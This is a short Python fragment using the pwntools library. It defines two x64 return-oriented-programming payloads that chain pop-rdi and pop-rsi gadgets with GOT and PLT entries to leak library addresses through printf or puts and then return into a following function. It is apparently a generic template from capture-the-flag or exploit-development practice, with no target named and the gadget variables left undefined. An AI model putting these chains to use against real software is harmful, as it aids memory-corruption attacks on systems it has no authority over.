from pwn import *

payload_printf_x64 = psize(pop_rdi_ret)+psize(fmt)+ \
                     psize(pop_rsi_r15_ret)+psize(read_got)+psize(0)+\
                     psize(func_plt)+psize(next_func)

puts_payload_x64 = psize(pop_rdi_ret)+psize(func_got)+\
                   psize(func_plt)+psize(next_func)